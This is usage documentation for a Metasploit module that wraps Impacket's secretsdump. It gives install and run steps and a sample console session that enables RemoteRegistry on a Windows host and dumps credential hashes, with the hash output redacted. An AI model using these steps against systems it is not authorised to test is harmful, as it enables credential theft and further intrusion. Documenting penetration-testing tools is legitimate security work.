## Verification Steps

1. Install [Impacket][1] v0.9.17 from GitHub. The `impacket` package must be in
   Python's module path, so `import impacket` works from any directory.
1. Install [pycrypto][2] v2.7 (the experimental release). Impacket requires this
   specific version.
1. Start msfconsole
1. Do: `use auxiliary/scanner/smb/impacket/secretsdump`
1. Set: `RHOSTS`, `SMBUser`, `SMBPass`
1. Do: `run`, see hashes from the remote machine

## Scenarios

```
metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/secretsdump) > show options 

Module options (auxiliary/scanner/smb/impacket/secretsdump):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ExecMethod  smbexec          yes       The method to use for execution (Accepted: smbexec, wmiexec, mmcexec)
   OutputFile                   no        Write the results to a file
   RHOSTS      192.168.90.11    yes       The target address range or CIDR identifier
   SMBDomain   .                no        The Windows domain to use for authentication
   SMBPass     wakawaka         yes       The password for the specified username
   SMBUser     spencer          yes       The username to authenticate as
   THREADS     1                yes       The number of concurrent threads

metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/secretsdump) > run

[*] [2018.04.04-17:15:45] Running for 192.168.90.11...
[*] [2018.04.04-17:15:45] 192.168.90.11 - Service RemoteRegistry is in stopped state
[*] [2018.04.04-17:15:45] 192.168.90.11 - Service RemoteRegistry is disabled, enabling it
[*] [2018.04.04-17:15:45] 192.168.90.11 - Starting service RemoteRegistry
[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for JD
[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for Skew1
[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for GBG
[*] [2018.04.04-17:15:46] 192.168.90.11 - Retrieving class info for Data
[REDACTED]
[*] [2018.04.04-17:15:48] 192.168.90.11 - Cleaning up... 
[*] [2018.04.04-17:15:48] 192.168.90.11 - Stopping service RemoteRegistry
[*] [2018.04.04-17:15:48] 192.168.90.11 - Restoring the disabled state for service RemoteRegistry
[*] [2018.04.04-17:15:48] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

[1]: https://github.com/CoreSecurity/impacket
[2]: https://www.dlitz.net/software/pycrypto/
